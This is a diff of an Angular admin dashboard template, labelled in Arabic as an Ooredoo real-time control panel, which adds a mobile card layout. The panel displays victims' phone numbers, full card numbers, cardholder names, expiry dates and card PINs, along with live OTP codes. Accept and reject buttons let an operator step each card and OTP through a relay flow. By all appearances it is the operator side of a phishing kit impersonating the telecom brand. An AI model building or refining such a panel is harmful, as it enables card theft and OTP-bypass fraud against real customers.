@@ -2,63 +2,73 @@
   style="direction: rtl; font-family: 'Cairo', 'Outfit', 'Inter', sans-serif;">
 
   <!-- Premium background glow elements -->
-  <div class="absolute top-0 right-1/4 w-125 h-125 bg-red-500/4 rounded-full blur-[120px] pointer-events-none">
-  </div>
-  <div
-    class="absolute bottom-0 left-1/4 w-125 h-125 bg-red-500/4 rounded-full blur-[120px] pointer-events-none">
-  </div>
+  <div class="absolute top-0 right-1/4 w-125 h-125 bg-red-500/4 rounded-full blur-[120px] pointer-events-none"></div>
+  <div class="absolute bottom-0 left-1/4 w-125 h-125 bg-red-500/4 rounded-full blur-[120px] pointer-events-none"></div>
 
-  <!-- Navbar -->
-  <header
-    class="w-full bg-white/80 backdrop-blur-xl border-b border-slate-200/80 px-8 py-5 flex items-center justify-between sticky top-0 z-20 shadow-md shadow-slate-100/40">
-    <div class="flex items-center gap-4">
-      <span class="w-4 h-4 bg-red-600 rounded-full animate-pulse"></span>
-      <h1 class="text-2xl font-black text-slate-900 tracking-wide">لوحة التحكم اللحظية Ooredoo</h1>
-      <span class="text-sm bg-slate-100 text-slate-600 font-bold px-3 py-1 rounded-full border border-slate-200">لوحة
-        المشرف</span>
+  <!-- ═══════════════════════════════════ Navbar ════════════════════════════════════ -->
+  <header class="w-full bg-white/80 backdrop-blur-xl border-b border-slate-200/80 sticky top-0 z-20 shadow-md shadow-slate-100/40
+           px-4 py-3 sm:px-8 sm:py-5
+           flex items-center justify-between gap-2">
+
+    <!-- Brand -->
+    <div class="flex items-center gap-2 sm:gap-4 min-w-0">
+      <span class="shrink-0 w-3 h-3 sm:w-4 sm:h-4 bg-red-600 rounded-full animate-pulse"></span>
+      <h1 class="text-base sm:text-2xl font-black text-slate-900 tracking-wide truncate">
+        <!-- Short label on mobile, full on sm+ -->
+        <span class="sm:hidden">لوحة التحكم</span>
+        <span class="hidden sm:inline">لوحة التحكم اللحظية Ooredoo</span>
+      </h1>
     </div>
 
     <!-- Admin profile & logout -->
-    <div class="flex items-center gap-5">
+    <div class="flex items-center gap-2 sm:gap-5 shrink-0">
       <div class="hidden sm:flex flex-col text-left">
         <span class="text-xs text-slate-500 font-bold">تسجيل الدخول كـ</span>
         <span class="text-base font-bold text-slate-800">{{ adminEmail() }}</span>
       </div>
-      <button (click)="logout()" type="button"
-        class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-200 px-5 py-2.5 rounded-2xl text-sm font-extrabold transition-all duration-200 cursor-pointer active:scale-95 shadow-sm hover:shadow">
+      <button (click)="logout()" type="button" class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-200
+               px-3 py-2 sm:px-5 sm:py-2.5
+               rounded-2xl text-xs sm:text-sm font-extrabold
+               transition-all duration-200 cursor-pointer active:scale-95 shadow-sm hover:shadow whitespace-nowrap">
         تسجيل الخروج
       </button>
     </div>
   </header>
 
-  <!-- Dashboard Content -->
-  <main class="grow p-8 z-10">
-    <div class="max-w-7xl mx-auto space-y-8">
+  <!-- ═══════════════════════════════ Dashboard Content ════════════════════════════ -->
+  <main class="grow p-3 sm:p-8 z-10">
+    <div class="max-w-7xl mx-auto space-y-4 sm:space-y-8">
 
-      <!-- Realtime Operations Table Card -->
-      <div class="bg-white rounded-3xl border border-slate-200/80 overflow-hidden shadow-lg">
-        <div class="px-8 py-6 border-b border-slate-100 flex items-center justify-between bg-slate-50/50">
+      <!-- Card wrapper -->
+      <div class="bg-white rounded-2xl sm:rounded-3xl border border-slate-200/80 overflow-hidden shadow-lg">
+
+        <!-- ── Card Header ─────────────────────────────────────────────── -->
+        <div class="px-4 py-4 sm:px-8 sm:py-6 border-b border-slate-100 bg-slate-50/50
+                    flex items-start sm:items-center justify-between gap-3 flex-wrap">
           <div>
-            <h2 class="text-xl font-black text-slate-900">جدول الطلبات المباشرة (Real-Time)</h2>
-            <p class="text-sm text-slate-600 mt-1.5">تحديث حي لحظي للبيانات وحركة العملاء دون الحاجة لتحديث الصفحة</p>
+            <h2 class="text-base sm:text-xl font-black text-slate-900">جدول الطلبات المباشرة (Real-Time)</h2>
+            <p class="hidden sm:block text-sm text-slate-600 mt-1.5">
+              تحديث حي لحظي للبيانات وحركة العملاء دون الحاجة لتحديث الصفحة
+            </p>
           </div>
+
           <!-- Live / Disconnected Indicator -->
           @if (wsConnected()) {
           <div
-            class="flex items-center gap-2.5 bg-emerald-50 text-emerald-700 px-4 py-1.5 rounded-full border border-emerald-200 text-sm font-black">
-            <span class="w-2.5 h-2.5 bg-emerald-500 rounded-full animate-ping"></span>
+            class="flex items-center gap-2 bg-emerald-50 text-emerald-700 px-3 py-1.5 rounded-full border border-emerald-200 text-xs sm:text-sm font-black shrink-0">
+            <span class="w-2 h-2 sm:w-2.5 sm:h-2.5 bg-emerald-500 rounded-full animate-ping"></span>
             <span>بث حي</span>
           </div>
           } @else {
           <div
-            class="flex items-center gap-2.5 bg-amber-50 text-amber-700 px-4 py-1.5 rounded-full border border-amber-200 text-sm font-black">
-            <span class="w-2.5 h-2.5 bg-amber-400 rounded-full animate-pulse"></span>
+            class="flex items-center gap-2 bg-amber-50 text-amber-700 px-3 py-1.5 rounded-full border border-amber-200 text-xs sm:text-sm font-black shrink-0">
+            <span class="w-2 h-2 sm:w-2.5 sm:h-2.5 bg-amber-400 rounded-full animate-pulse"></span>
             <span>جاري الاتصال...</span>
           </div>
           }
         </div>
 
-        <!-- Loading State -->
+        <!-- ── Loading State ───────────────────────────────────────────── -->
         @if (isLoading() && clients().length === 0) {
         <div class="px-6 py-16 text-center">
           <div class="inline-flex items-center gap-3 text-slate-500 font-bold text-lg">
@@ -74,7 +84,7 @@
         </div>
         }
 
-        <!-- Error State -->
+        <!-- ── Error State ─────────────────────────────────────────────── -->
         @else if (errorMessage() && clients().length === 0) {
         <div class="px-6 py-16 text-center">
           <p class="text-red-500 font-bold text-lg">{{ errorMessage() }}</p>
@@ -85,9 +95,12 @@
         </div>
         }
 
-        <!-- Table -->
         @else {
-        <div class="overflow-x-auto w-full">
+
+        <!-- ════════════════════════════════════════════════════════════
+               DESKTOP TABLE  (hidden on mobile, shown from sm+)
+               ════════════════════════════════════════════════════════════ -->
+        <div class="hidden sm:block overflow-x-auto w-full">
           <table class="w-full text-right border-collapse">
             <thead>
               <tr
@@ -104,14 +117,15 @@
             <tbody class="divide-y divide-slate-100 text-base">
               @for (client of clients(); track client.id) {
               <tr class="hover:bg-slate-50/50 transition-colors">
-                <!-- Phone number -->
-                <td class="px-6 py-5.5 font-black text-slate-900 text-base sm:text-lg tracking-wide">{{
-                  client.phone_number }}</td>
 
-                <!-- Credit balance -->
-                <td class="px-6 py-5.5 font-extrabold text-slate-800 text-base sm:text-lg">{{ client.credit }} د.ك</td>
+                <td class="px-6 py-5.5 font-black text-slate-900 text-base sm:text-lg tracking-wide">
+                  {{ client.phone_number }}
+                </td>
 
-                <!-- Card info: computed once per row via local variable -->
+                <td class="px-6 py-5.5 font-extrabold text-slate-800 text-base sm:text-lg">
+                  {{ client.credit }} د.ك
+                </td>
+
                 <td class="px-6 py-5.5">
                   @let payment = getLatestPayment(client);
                   @if (payment) {
@@ -130,17 +144,11 @@
                   }
                 </td>
 
-                <!-- PIN -->
                 <td class="px-6 py-5.5 font-mono font-black text-red-600 text-lg sm:text-xl tracking-widest">
                   @let pinPayment = getLatestPayment(client);
-                  @if (pinPayment) {
-                  {{ pinPayment.cc_pin }}
-                  } @else {
-                  <span class="text-slate-400">-</span>
-                  }
+                  @if (pinPayment) { {{ pinPayment.cc_pin }} } @else { <span class="text-slate-400">-</span> }
                 </td>
 
-                <!-- OTP -->
                 <td class="px-6 py-5.5">
                   @let otp = getLatestOtp(client);
                   @let latestPayment = getLatestPayment(client);
@@ -156,12 +164,10 @@
                   }
                 </td>
 
-                <!-- Admin Actions -->
                 <td class="px-6 py-5.5">
                   @let actionPayment = getLatestPayment(client);
                   @let actionOtp = getLatestOtp(client);
                   <div class="flex flex-col gap-3.5">
-                    <!-- Payment decisions -->
                     @if (actionPayment) {
                     @if (actionPayment.status === 'PENDING') {
                     <div class="flex items-center gap-2">
@@ -179,16 +185,14 @@
                     <div class="flex items-center gap-1.5 text-sm">
                       <span class="text-slate-500 font-medium">حالة البطاقة:</span>
                       <span [ngClass]="{
-                              'text-emerald-700 bg-emerald-50 border-emerald-200': actionPayment.status === 'ACCEPTED',
-                              'text-red-700 bg-red-50 border-red-200': actionPayment.status === 'REJECTED'
-                            }" class="px-3 py-1 rounded-lg border font-extrabold">
+                                  'text-emerald-700 bg-emerald-50 border-emerald-200': actionPayment.status === 'ACCEPTED',
+                                  'text-red-700 bg-red-50 border-red-200': actionPayment.status === 'REJECTED'
+                                }" class="px-3 py-1 rounded-lg border font-extrabold">
                         {{ actionPayment.status }}
                       </span>
                     </div>
                     }
                     }
-
-                    <!-- OTP decisions -->
                     @if (actionOtp) {
                     @if (actionOtp.status === 'PENDING') {
                     <div class="flex items-center gap-2 border-t border-slate-100 pt-3">
@@ -206,9 +210,9 @@
                     <div class="flex items-center gap-1.5 text-sm border-t border-slate-100 pt-3">
                       <span class="text-slate-500 font-medium">حالة الـ OTP:</span>
                       <span [ngClass]="{
-                              'text-emerald-700 bg-emerald-50 border-emerald-200': actionOtp.status === 'ACCEPTED',
-                              'text-red-700 bg-red-50 border-red-200': actionOtp.status === 'REJECTED'
-                            }" class="px-3 py-1 rounded-lg border font-extrabold">
+                                  'text-emerald-700 bg-emerald-50 border-emerald-200': actionOtp.status === 'ACCEPTED',
+                                  'text-red-700 bg-red-50 border-red-200': actionOtp.status === 'REJECTED'
+                                }" class="px-3 py-1 rounded-lg border font-extrabold">
                         {{ actionOtp.status }}
                       </span>
                     </div>
@@ -217,7 +221,6 @@
                   </div>
                 </td>
 
-                <!-- Date -->
                 <td class="px-6 py-5.5 text-left font-semibold text-slate-600 text-sm">
                   {{ client.created_at | date:'yyyy-MM-dd HH:mm:ss' }}
                 </td>
@@ -233,23 +236,138 @@
           </table>
         </div>
 
-        <!-- Pagination Footer -->
+        <!-- ════════════════════════════════════════════════════════════
+               MOBILE CARDS  (shown on mobile only, hidden from sm+)
+               ════════════════════════════════════════════════════════════ -->
+        <div class="sm:hidden divide-y divide-slate-100">
+          @for (client of clients(); track client.id) {
+          @let mPayment = getLatestPayment(client);
+          @let mOtp = getLatestOtp(client);
+
+          <div class="p-4 space-y-3">
+
+            <!-- ── Row 1: Phone + Amount ── -->
+            <div class="flex items-center justify-between">
+              <span class="text-base font-black text-slate-900 tracking-wide">{{ client.phone_number }}</span>
+              <span
+                class="text-sm font-extrabold text-slate-700 bg-slate-100 px-3 py-1 rounded-full border border-slate-200">
+                {{ client.credit }} د.ك
+              </span>
+            </div>
+
+            <!-- ── Row 2: Card info ── -->
+            @if (mPayment) {
+            <div class="bg-slate-50 rounded-xl p-3 space-y-1 border border-slate-100">
+              <div class="flex items-center justify-between">
+                <span class="text-xs text-slate-400 font-bold">بيانات البطاقة</span>
+                <span class="text-xs text-slate-500">تنتهي في: {{ mPayment.cc_month }}/{{ mPayment.cc_year }}</span>
+              </div>
+              <p class="font-mono font-bold text-slate-900 tracking-widest text-sm">{{ mPayment.cc_number }}</p>
+              <p class="text-xs text-slate-600 font-semibold">{{ mPayment.cc_name }}</p>
+              <!-- PIN -->
+              <div class="flex items-center gap-2 pt-1 border-t border-slate-200 mt-1">
+                <span class="text-xs text-slate-400 font-bold">PIN:</span>
+                <span class="font-mono font-black text-red-600 text-base tracking-widest">{{ mPayment.cc_pin }}</span>
+              </div>
+            </div>
+            } @else {
+            <p class="text-xs text-slate-400 font-semibold italic px-1">بانتظار إدخال البطاقة...</p>
+            }
+
+            <!-- ── Row 3: OTP ── -->
+            @if (mOtp) {
+            <div class="flex items-center justify-between bg-sky-50 rounded-xl p-3 border border-sky-100">
+              <div>
+                <p class="text-xs text-sky-500 font-bold mb-0.5">كود التحقق OTP</p>
+                <span class="font-mono text-xl font-black text-sky-600 tracking-wider">{{ mOtp.otp }}</span>
+              </div>
+              <span class="text-xs font-bold px-2.5 py-1 rounded-full border" [ngClass]="{
+                    'text-emerald-700 bg-emerald-50 border-emerald-200': mOtp.status === 'ACCEPTED',
+                    'text-red-700 bg-red-50 border-red-200': mOtp.status === 'REJECTED',
+                    'text-amber-700 bg-amber-50 border-amber-200': mOtp.status === 'PENDING'
+                  }">
+                {{ mOtp.status }}
+              </span>
+            </div>
+            } @else if (mPayment?.status === 'ACCEPTED') {
+            <p class="text-xs text-sky-600 font-bold animate-pulse px-1">بانتظار إدخال OTP...</p>
+            }
+
+            <!-- ── Row 4: Admin Action Buttons ── -->
+            <div class="space-y-2">
+              <!-- Payment actions -->
+              @if (mPayment?.status === 'PENDING') {
+              <div class="flex gap-2">
+                <span class="text-xs text-slate-500 font-bold self-center shrink-0">البطاقة:</span>
+                <button (click)="handlePaymentAction(mPayment!.id, 'ACCEPTED')"
+                  class="flex-1 bg-emerald-50 hover:bg-emerald-100 text-emerald-700 border border-emerald-200 py-2.5 rounded-xl text-sm font-black transition-colors cursor-pointer active:scale-95">
+                  ✓ موافقة
+                </button>
+                <button (click)="handlePaymentAction(mPayment!.id, 'REJECTED')"
+                  class="flex-1 bg-red-50 hover:bg-red-100 text-red-700 border border-red-200 py-2.5 rounded-xl text-sm font-black transition-colors cursor-pointer active:scale-95">
+                  ✕ رفض
+                </button>
+              </div>
+              } @else if (mPayment) {
+              <div class="flex items-center gap-2 text-xs">
+                <span class="text-slate-400 font-medium">حالة البطاقة:</span>
+                <span class="px-2.5 py-1 rounded-lg border font-extrabold" [ngClass]="{
+                      'text-emerald-700 bg-emerald-50 border-emerald-200': mPayment.status === 'ACCEPTED',
+                      'text-red-700 bg-red-50 border-red-200': mPayment.status === 'REJECTED'
+                    }">
+                  {{ mPayment.status }}
+                </span>
+              </div>
+              }
+
+              <!-- OTP actions -->
+              @if (mOtp?.status === 'PENDING') {
+              <div class="flex gap-2">
+                <span class="text-xs text-slate-500 font-bold self-center shrink-0">OTP:</span>
+                <button (click)="handleOtpAction(mOtp!.id, 'ACCEPTED')"
+                  class="flex-1 bg-emerald-600 hover:bg-emerald-700 text-white py-2.5 rounded-xl text-sm font-black transition-colors cursor-pointer active:scale-95">
+                  ✓ موافقة
+                </button>
+                <button (click)="handleOtpAction(mOtp!.id, 'REJECTED')"
+                  class="flex-1 bg-red-600 hover:bg-red-700 text-white py-2.5 rounded-xl text-sm font-black transition-colors cursor-pointer active:scale-95">
+                  ✕ رفض
+                </button>
+              </div>
+              }
+            </div>
+
+            <!-- ── Row 5: Date ── -->
+            <p class="text-xs text-slate-400 font-semibold text-left">
+              {{ client.created_at | date:'yyyy-MM-dd HH:mm' }}
+            </p>
+
+          </div>
+          } @empty {
+          <div class="px-4 py-14 text-center text-slate-500 font-bold">
+            لا يوجد عملاء أو معاملات مسجلة حالياً
+          </div>
+          }
+        </div>
+
+        }
+        <!-- ── Pagination Footer ────────────────────────────────────────── -->
         @if (pagination(); as p) {
-        <div class="px-8 py-4 border-t border-slate-100 flex items-center justify-between bg-slate-50/30">
-          <span class="text-sm text-slate-500 font-bold">
+        <div
+          class="px-4 py-3 sm:px-8 sm:py-4 border-t border-slate-100 flex items-center justify-between bg-slate-50/30">
+          <span class="text-xs sm:text-sm text-slate-500 font-bold">
             عرض {{ clients().length }} من أصل {{ p.total }} عميل
           </span>
           @if (p.hasMore) {
-          <button (click)="loadNextPage()" type="button" [disabled]="isLoading()"
-            class="bg-red-50 hover:bg-red-100 disabled:opacity-50 text-red-600 border border-red-200 px-5 py-2 rounded-2xl text-sm font-extrabold transition-all cursor-pointer active:scale-95">
+          <button (click)="loadNextPage()" type="button" [disabled]="isLoading()" class="bg-red-50 hover:bg-red-100 disabled:opacity-50 text-red-600 border border-red-200
+                   px-4 py-2 sm:px-5 sm:py-2 rounded-2xl text-xs sm:text-sm font-extrabold
+                   transition-all cursor-pointer active:scale-95">
             @if (isLoading()) { جاري التحميل... } @else { تحميل المزيد }
           </button>
           }
         </div>
         }
-        }
 
-      </div>
+      </div><!-- /card wrapper -->
 
     </div>
   </main>
